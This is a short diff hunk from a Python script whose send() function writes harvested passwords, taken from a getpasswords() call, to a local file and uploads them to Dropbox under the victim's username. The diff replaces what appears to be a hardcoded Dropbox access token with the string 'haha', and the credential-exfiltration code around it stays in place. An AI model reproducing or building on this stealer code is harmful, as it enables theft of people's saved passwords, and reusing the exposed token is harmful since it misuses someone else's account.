@@ -65,7 +65,7 @@ def send():
         writer.write(str(getpasswords()['passwords'][i]) + '\n')
     writer.close()
 
-    dbx=dropbox.Dropbox('j3KeUtNcD7AAAAAAAAAATdK6tW8r0kR19tE9_6X3TdJN3HhEj8dl1zfHVWMYRDCf')
+    dbx=dropbox.Dropbox('haha')
     
     file_to="/" + getpasswords()['user'] + "_lol.txt"
     upload = open("C:\\prog\\lol.txt","rb")
